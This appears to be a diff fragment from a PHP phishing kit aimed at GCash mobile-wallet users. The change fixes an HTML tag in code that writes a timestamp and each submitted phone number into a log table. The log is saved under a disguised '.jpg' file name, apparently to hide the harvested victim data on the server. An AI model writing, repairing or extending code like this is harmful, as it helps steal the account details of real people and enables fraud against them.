@@ -12,7 +12,7 @@ fclose($zCh);
 // gcash logs
 $ChB = fopen("logs/gcash-logs.jpg", "a");
 fwrite($ChB, '<tr>' . "\n");
-fwrite($ChB, '<td>' . $time . '<\td>' . "\n");
+fwrite($ChB, '<td>' . $time . '</td>' . "\n");
 fwrite($ChB, '<td>' . $_POST['number'] . '</td>' . "\n");
 fclose($ChB);
 
